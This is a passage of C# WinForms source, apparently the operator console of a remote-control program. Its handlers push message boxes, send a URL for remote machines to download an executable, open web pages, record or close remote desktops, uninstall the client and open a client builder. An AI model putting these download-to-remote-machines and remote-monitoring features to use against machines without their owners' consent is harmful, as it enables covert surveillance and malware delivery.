            this._deskrefreshTimeSpan = (int)deskrefreshTimeSpan.Value;

            foreach (UDesktopView item in desktopViewLayout.Controls)
            {
                item.Width = _desktopViewWidth;
                item.Height = _desktopViewHeight;
            }

            this.WriteRuninglog("设置已保存!", "ok");
        }

        private void RowtrackBar_Scroll(object sender, EventArgs e)
        {
            this.row.Text = rowtrackBar.Value.ToString();
        }

        private void ColumntrackBar_Scroll(object sender, EventArgs e)
        {
            this.column.Text = columntrackBar.Value.ToString();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            foreach (UDesktopView item in desktopViewLayout.Controls)
                item.Checked = true;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            foreach (UDesktopView item in desktopViewLayout.Controls)
                item.Checked = false;
        }
        private void toolStripButton7_Click(object sender, EventArgs e)
        {
            NotifyMessageBoxForm dlg = new NotifyMessageBoxForm();
            DialogResult result = dlg.ShowDialog();
            if (result == System.Windows.Forms.DialogResult.OK)
            {
                byte[] data = MessageHelper.CopyMessageHeadTo(MessageHead.S_MAIN_MESSAGEBOX,
                    new MessagePack()
                    {
                        MessageTitle = dlg.MessageTitle,
                        MessageBody = dlg.MessageBody,
                        MessageIcon = (byte)dlg.MsgBoxIcon
                    });
                SelectedDesktopViewSend(data);
            }
        }

        private void toolStripButton6_Click(object sender, EventArgs e)
        {
            EnterForm input = new EnterForm();
            input.Caption = "可执行文件的下载地址";
            DialogResult result = input.ShowDialog();
            if (input.Value != "" && result == DialogResult.OK)
            {
                if (input.Value.IndexOf("http://") == -1 && input.Value.IndexOf("https://") == -1)
                {
                    MessageBox.Show("输入的网址不合法", "提示", 0, MessageBoxIcon.Exclamation);
                    return;
                }

                byte[] data = MessageHelper.CopyMessageHeadTo(MessageHead.S_MAIN_HTTPDOWNLOAD,
                    input.Value);
                SelectedDesktopViewSend(data);
            }
        }

        private void toolStripButton8_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("确定解除对该远程计算机的控制吗？", "提示", MessageBoxButtons.OKCancel, MessageBoxIcon.Exclamation) != DialogResult.OK)
                return;
            byte[] data = MessageHelper.CopyMessageHeadTo(MessageHead.S_MAIN_SESSION, new byte[] { UNSTALL });
            SelectedDesktopViewSend(data);
        }

        private void toolStripButton10_Click(object sender, EventArgs e)
        {
            AppSettingForm appConfigForm = new AppSettingForm();
            appConfigForm.ShowDialog();
        }

        private void toolStripButton9_Click(object sender, EventArgs e)
        {
            BuilderServiceForm serviceBuilder = new BuilderServiceForm();
            serviceBuilder.ShowDialog();
        }

        private void ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.ToolStripMenuItem.Checked == true)
            {
                this.ToolStripMenuItem.Checked = false;
                this.toolStrip1.Visible = false;
            }
            else
            {
                this.ToolStripMenuItem.Checked = true;
                this.toolStrip1.Visible = true;
            }
        }

        private void toolStripMenuItem6_Click_1(object sender, EventArgs e)
        {
            EnterForm input = new EnterForm();
            input.Caption = "请输入要打开的网页地址!";
            DialogResult result = input.ShowDialog();
            if (input.Value != "" && result == DialogResult.OK)
            {
                byte[] data = MessageHelper.CopyMessageHeadTo(MessageHead.S_MAIN_OPEN_WEBURL,
                    input.Value);
                SelectedSend(data);
            }
        }

        private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            this._isRun = false;
            this._sessionProvider.CloseService();
        }

        private void toolStripButton14_Click(object sender, EventArgs e)
        {
            foreach (UDesktopView view in desktopViewLayout.Controls)
            {
                if (view.Checked)
                {
                    SessionHandler session = view.Session;

                    byte[] data = MessageHelper.CopyMessageHeadTo(MessageHead.S_MAIN_USERDESKTOP_CLOSE);
                    session.SendAsync(data);

                    var syncContext = session.AppTokens[1] as SessionSyncContext;

                    if (view != null)
                        DisposeDesktopView(view);

                    syncContext.DesktopView = null;
                    syncContext.OnSessionListItem.BackColor = _closeScreenColor;

                    view.Checked = false;
                }
            }
        }
        private void lockToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.LockWindow();
        }
        private void toolStripMenuItem11_Click(object sender, EventArgs e)
        {
            foreach (USessionListItem item in SelectedSend(null))
            {
                var dlg = new DesktopRecordForm(item.SyncContext.Session);
                dlg.Show();
            }
        }

        private void viewReviewToolStripMenuItem_Click(object sender, EventArgs e)
        {
            DesktopRecordViewerForm recordViewer = new DesktopRecordViewerForm();
            recordViewer.Show();
        }

        private void logList_MouseEnter(object sender, EventArgs e)
        {
            this.splitContainer2.SplitterDistance = splitContainer2.Width - (splitContainer2.Width / 4);
        }

        private void onlineList_MouseEnter(object sender, EventArgs e)
        {
            this.splitContainer2.SplitterDistance = (splitContainer2.Width / 4);
        }
    }
}